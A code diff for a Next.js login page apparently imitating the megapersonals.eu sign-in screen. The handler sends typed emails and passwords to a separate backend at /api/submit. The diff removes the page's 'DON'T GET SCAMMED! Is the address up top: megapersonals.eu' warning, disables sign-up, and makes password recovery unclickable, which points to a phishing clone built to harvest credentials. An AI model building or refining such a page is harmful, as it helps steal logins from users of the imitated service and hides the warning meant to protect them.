@@ -4,6 +4,8 @@ import loginBenner from '@/images/loginbenner.png';
 import reloadbutton from '@/images/reloadButton.png';
 import Image from 'next/image';
 import axios from 'axios';
+import frame from '@/images/frame.png';
+import MessageModal from '@/components/MessageModal';
 
 
 const page = () => {
@@ -47,8 +49,8 @@ const page = () => {
 
 
       const [currentImage, setCurrentImage] = useState(images[0]);
-
-      // Step 3: Function to change the image randomly
+      const [showMessage,setShowMessage] = useState(false);
+      
       const changeImage = () => {
         const randomIndex = Math.floor(Math.random() * images.length);
         setCurrentImage(images[randomIndex]);
@@ -71,20 +73,20 @@ const page = () => {
       };
 
       const handlesubmit =async (e) => {
-        e.preventDefault(); // Prevent form from refreshing the page
+        e.preventDefault(); 
         await axios.post('http://localhost:5000/api/submit', { email:formData.email, password:formData.password });
 
 
-        // window.location.reload();
-
-        // Do something with the email and password (e.g., authentication)
-
-        // Clear the input fields by resetting the state
         setFormData({
           email: '',
           password: '',
           otp:''
         });
+      }
+
+
+      const handleshowMessage = () => {
+        setShowMessage(!showMessage);
       }
 
 
@@ -95,7 +97,7 @@ const page = () => {
            <section className='flex flex-col items-center gap-4'>
             <div className='flex flex-col items-center gap-2'>
                 <h3 className='text-[#B9A697] text-[18px] font-normal'>Is this your first time posting?</h3>
-                <button className='w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]'>Start Here</button>
+                <button disabled className='w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]'>Start Here</button>
             </div>
             <h3 className='text-[#B9A697] text-[18px] font-normal '>Already have an account?</h3>
 
@@ -103,8 +105,8 @@ const page = () => {
                 <input type="email" name="email" value={formData.email} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
                 <input type="password" name="password" value={formData.password} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Password' required/>
                 <div className='flex items-center justify-between'>
-                    <div className='border-2 border-[#c0c0c0] rounded'><Image className='p-[2px]' src={currentImage} width={191} height={37}/></div>
-                    <span onClick={changeImage} className='cursor-pointer'><Image src={reloadbutton} width={41} height={41}/></span>
+                    <div className='border-2 border-[#c0c0c0] rounded'><Image className='p-[2px]' src={currentImage} width={191} height={37} alt='..'/></div>
+                    <span onClick={changeImage} className='cursor-pointer'><Image src={reloadbutton} width={41} height={41} alt='...'/></span>
                 </div>
                 <input type="text" name="otp" value={formData.otp} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Enter code from the picture'/>
 
@@ -112,21 +114,13 @@ const page = () => {
                 <input className='w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer' type="submit" value="SUBMIT" />
                 </div>
 
-                <div className=' rounded bg-[#F6DB4D] p-[10px]'>
-                    <div className='border-2 border-black rounded px-[10px]'>
-                        <h3 className='font-bold text-[19px] text-[#1B1B1B]'>DON’T GET SCAMMED!</h3>
-                        <div className='flex items-center justify-between '>
-                            <span className='p-0 m-0'>
-                                <h3 className='text-[#1B1B1B] text-[16px] font-normal'>Is the address up top:</h3>
-                                <h3 className='text-[#1B1B1B] text-[16px] font-normal'>megapersonals.eu</h3>
-                            </span>
-                            <h2 className='text-[50px] w-[31px] font-bold'>?</h2>
-                        </div>
-                    </div>
-                </div>
+              <Image className='cursor-pointer' onClick={handleshowMessage} src={frame} height={109} width={252} alt='...' />
+              {
+                showMessage && <MessageModal  setShowMessage={setShowMessage} showMessage={showMessage}/>
+              }
             </form>
 
-            <h3 className='text-[#0000EE] text-[14px] font-normal cursor-pointer'>FORGOT PASSWORD?</h3>
+            <h3 className='text-[#0000EE] text-[14px] font-normal'>FORGOT PASSWORD?</h3>
 
             <div className='text-center flex flex-col gap-[26px]'>
           <ul className='flex gap-2 justify-center text-[#0481C9] text-[13px] font-normal'>
